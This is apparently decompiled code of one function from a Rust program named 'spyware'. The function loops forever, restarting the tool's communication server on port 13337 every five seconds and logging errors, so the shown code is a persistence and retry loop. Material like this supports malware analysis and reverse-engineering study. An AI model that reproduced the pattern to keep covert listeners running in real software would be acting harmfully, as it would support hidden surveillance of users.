void _ZN7spyware15run_server_loop17ha507d6dda312d1beE(void)

{
  undefined *puVar1;
  undefined *puVar2;
  ulong uVar3;
  long lVar4;
  long lVar5;
  long local_b8;
  undefined *local_b0;
  undefined8 local_a8;
  undefined *local_a0;
  undefined8 local_98;
  undefined8 local_90;
  long local_88;
  undefined **local_80;
  undefined8 local_78;
  long **local_70;
  undefined8 local_68;
  undefined8 uStack_60;
  long *local_50;
  undefined *local_48;
  undefined *local_40;
  undefined *local_38;
  
  puVar2 = PTR__ZN3std6thread5sleep17h1a6eeffe1c923e1fE_001be730;
  puVar1 = PTR__ZN3log13__private_api3loc17he75f2f86c1ff97b9E_001be620;
  do {
    uVar3 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
    if (uVar3 < 4) {
      lVar4 = _ZN7spyware13communication6server10run_server17hf575f6adb91dbfb6E(0x3419);
      lVar5 = local_88;
    }
    else {
      local_80 = &PTR_DAT_001b92a0;
      local_78 = 1;
      local_70 = (long **)&DAT_00000008;
      local_68 = 0;
      uStack_60 = 0;
      local_90 = (*(code *)puVar1)(&PTR_DAT_001b9300);
      local_b0 = &DAT_001127b8;
      local_a8 = 7;
      local_a0 = &DAT_001127b8;
      local_98 = 7;
      _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_80,4,&local_b0);
      lVar4 = _ZN7spyware13communication6server10run_server17hf575f6adb91dbfb6E(0x3419);
      lVar5 = local_88;
    }
    local_88 = lVar4;
    if (local_88 != 0) {
      lVar5 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
      if (lVar5 != 0) {
        local_b8 = 5;
        local_48 = 
        PTR__ZN60__LT_std__io__error__Error_u20_as_u20_core__fmt__Display_GT_3fmt17hcf0c0103019d8a0aE_001be638
        ;
        local_38 = 
        PTR__ZN4core3fmt3num3imp52__LT_impl_u20_core__fmt__Display_u20_for_u20_u64_GT_3fmt17h5424ed13591dfd18E_001be738
        ;
        local_80 = &PTR_DAT_001b92b0;
        local_78 = 3;
        uStack_60 = 0;
        local_70 = &local_50;
        local_68 = 2;
        local_50 = &local_88;
        local_40 = (undefined *)&local_b8;
                    /* try { // try from 00151990 to 001519c9 has its CatchHandler @ 00151afb */
        local_90 = (*(code *)puVar1)(&PTR_DAT_001b9318);
        local_b0 = &DAT_001127b8;
        local_a8 = 7;
        local_a0 = &DAT_001127b8;
        local_98 = 7;
        _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_80,1,&local_b0);
      }
      _ZN4core3ptr42drop_in_place_LT_std__io__error__Error_GT_17h2ffe2f512d0f1687E(&local_88);
      lVar5 = local_88;
    }
    local_88 = lVar5;
    uVar3 = _ZN4core4sync6atomic11atomic_load17h8c88032dab18ab12E();
    if (3 < uVar3) {
      local_b8 = 5;
      local_48 = 
      PTR__ZN4core3fmt3num3imp52__LT_impl_u20_core__fmt__Display_u20_for_u20_u64_GT_3fmt17h5424ed13591dfd18E_001be738
      ;
      local_80 = &PTR_DAT_001b92e0;
      local_78 = 2;
      uStack_60 = 0;
      local_70 = &local_50;
      local_68 = 1;
      local_50 = &local_b8;
      local_90 = (*(code *)puVar1)(&PTR_DAT_001b9330);
      local_b0 = &DAT_001127b8;
      local_a8 = 7;
      local_a0 = &DAT_001127b8;
      local_98 = 7;
      _ZN3log13__private_api3log17h13afddf373bd7d7fE(&local_80,4,&local_b0);
    }
    (*(code *)puVar2)(5,0);
  } while( true );
}